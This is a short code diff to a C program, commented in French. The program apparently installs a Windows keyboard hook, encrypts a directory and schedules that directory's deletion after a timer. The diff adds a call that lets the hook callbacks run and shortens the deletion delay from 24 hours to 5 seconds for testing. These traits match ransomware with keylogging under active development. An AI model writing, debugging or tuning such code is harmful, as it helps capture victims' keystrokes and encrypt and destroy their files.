@@ -83,9 +83,11 @@ int main() {
     while (GetMessage(&msg, NULL, 0, 0)) {
         TranslateMessage(&msg);
         DispatchMessage(&msg);
+        // Permettre l'exécution des callbacks
+        SleepEx(0, TRUE);
     }
 
-    UnhookWindowsHookEx(hKeyboardHook); //Supprime le hook à la fin
+    UnhookWindowsHookEx(hKeyboardHook); // Supprime le hook à la fin
 
     return 0;
 }
@@ -104,8 +106,8 @@ void perform_encryption(const char *directory, unsigned char *key, unsigned char
     encryption_done = 1;
     
     // Lance le timer pour supprimer le repertoire au bout de 24 h
-    // int wait_time_seconds = 5; // Délai de 5 secondes pour les tests
     int wait_time_seconds = 24 * 60* 60; // Délai de 24 heures 
+    wait_time_seconds = 5; // Délai de 5 secondes pour les tests // Todo
     printf("Le fichier sera supprimé dans %d secondes.\n", wait_time_seconds); 
     // Appel de la fonction pour planifier la suppression du fichier
     scheduleFileDeletion(directory, wait_time_seconds);
